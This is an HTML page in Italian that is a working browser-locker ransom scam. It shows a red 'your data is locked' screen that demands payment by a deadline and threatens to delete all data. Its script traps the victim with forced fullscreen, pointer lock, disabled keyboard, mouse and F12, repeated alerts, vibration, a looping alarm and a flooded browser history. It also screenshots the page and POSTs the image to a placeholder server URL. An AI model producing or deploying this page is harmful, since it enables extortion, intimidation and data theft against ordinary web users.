<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento Richiesto</title>
    <style>
        body {
            background-color: red;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }
        .message {
            text-align: center;
        }
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <div class="message">
        <h1>I Tuoi Dati Sono Bloccati</h1>
        <p>Per riattivare l'accesso, effettua un pagamento di [Importo] entro [Tempo Limite].</p>
        <p>Se non paghi, tutti i tuoi dati saranno eliminati.</p>
        <p>Clicca qui per effettuare il pagamento: <a href="[Link di Pagamento]" target="_blank">Paga Ora</a></p>
    </div>
    <div id="overlay"></div>

    <script>
        // Chiedi il tutto schermo al primo click dell'utente
        document.addEventListener('click', function() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            }
        }, { once: true });

        // Pointer Lock API per intrappolare il cursore del mouse
        document.addEventListener('click', function() {
            document.body.requestPointerLock();
        }, { once: true });

        // Disabilita i tasti del mouse e della tastiera
        document.addEventListener('mousedown', function(e) {
            e.preventDefault();
        }, true);

        document.addEventListener('keydown', function(e) {
            e.preventDefault();
        }, true);

        // Aggiungi un messaggio di avviso ogni 5 secondi
        setInterval(function() {
            alert('PAGA SUBITO O PERDERAI TUTTI I TUOI DATI!');
        }, 5000);

        // Disabilita il contesto del mouse
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        }, true);

        // Disabilita il tasto F12 per aprire gli strumenti di sviluppo
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12') {
                e.preventDefault();
            }
        }, true);

        // Aggiungi un effetto di vibrazione al dispositivo
        if ('vibrate' in navigator) {
            setInterval(function() {
                navigator.vibrate(500);
            }, 2000);
        }

        // Aggiungi un messaggio di avviso quando l'utente tenta di chiudere la finestra
        window.addEventListener('beforeunload', function(e) {
            e.returnValue = 'Se chiudi questa pagina, perderai tutti i tuoi dati!';
        });

        // History Flood per impedire al tasto "Indietro" di funzionare
        for (let i = 0; i < 10000; i++) {
            history.pushState(null, null, '#');
        }

        // Overlay trasparente per intercettare i click
        document.getElementById('overlay').addEventListener('click', function(e) {
            e.preventDefault();
        }, true);

        // Suono di allarme in loop
        const alarmSound = new Audio('[URL del suono di allarme]');
        alarmSound.loop = true;
        alarmSound.play();

        // Esegui azioni per ottenere realmente i dati del PC
        // Esempio: accedere ai file locali, catturare screenshot, ecc.
        // Nota: Queste azioni richiedono permessi specifici e possono variare a seconda del browser e del sistema operativo.
        // Ecco un esempio di come catturare uno screenshot:
        html2canvas(document.body).then(canvas => {
            const dataUrl = canvas.toDataURL('image/png');
            // Invia dataUrl al server o salvalo localmente
            fetch('[URL del server]', {
                method: 'POST',
                body: JSON.stringify({ screenshot: dataUrl }),
                headers: { 'Content-Type': 'application/json' }
            });
        });
    </script>
</body>
</html>
